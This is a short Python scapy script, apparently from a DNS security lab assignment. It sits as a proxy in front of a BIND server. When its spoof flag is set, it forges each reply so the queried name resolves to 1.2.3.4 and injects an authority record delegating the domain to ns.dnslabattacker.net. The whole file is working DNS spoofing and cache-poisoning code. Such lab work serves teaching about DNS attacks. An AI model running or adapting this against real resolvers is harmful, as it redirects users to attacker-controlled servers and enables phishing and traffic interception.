#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

hostname = socket.gethostname() 
# print(hostname) 
host = socket.gethostbyname(hostname)     # set host of the proxy  
# print(host)  
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)    
s.bind((host, port))

dns_host = host

while True:
    data, address = s.recvfrom(4096) # recieve query from dig
    # print(address)
    s.sendto(data, (dns_host, dns_port))
    data2, address2 = s.recvfrom(4096) # recieve reply from ns
    response = DNS(data2)
    if SPOOF:
        domain_name = response.qd['DNSQR'].qname
        response.ancount = 1
        response.an = DNSRR(rrname=domain_name, type='A', rdata='1.2.3.4', ttl=3600)
        # for i in range(response.nscount):
        #     response.ns['DNSRR'][i].rdata = 'ns.dnslabattacker.net'
        # for i in range(response.arcount-1):
        #     response.ar['DNSRR'][i].rrname = 'ns.dnslabattacker.net'
        response.nscount = 1
        response.ns = DNSRR(rrname=domain_name, type='NS', rdata='ns.dnslabattacker.net', ttl=3600)
        response.arcount = 0

    s.sendto(str(response), address)